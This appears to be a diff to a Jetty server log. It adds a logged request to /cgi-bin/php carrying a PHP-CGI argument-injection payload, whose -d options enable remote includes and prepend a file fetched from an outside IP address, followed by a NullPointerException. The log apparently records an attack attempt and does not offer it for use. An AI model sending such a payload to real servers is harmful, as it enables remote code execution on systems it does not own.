@@ -6649,3 +6649,5 @@ java.lang.NullPointerException
 2017-03-24 16:16:03.602:WARN:oejh.HttpGenerator:Ignoring extra content null
 2017-03-24 16:47:37.709:WARN:oejh.HttpGenerator:Ignoring extra content null
 2017-03-24 17:08:57.789:WARN:oejh.HttpGenerator:Ignoring extra content null
+2017-03-24 17:50:04.440:WARN:oejs.AbstractHttpConnection:/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+java.lang.NullPointerException
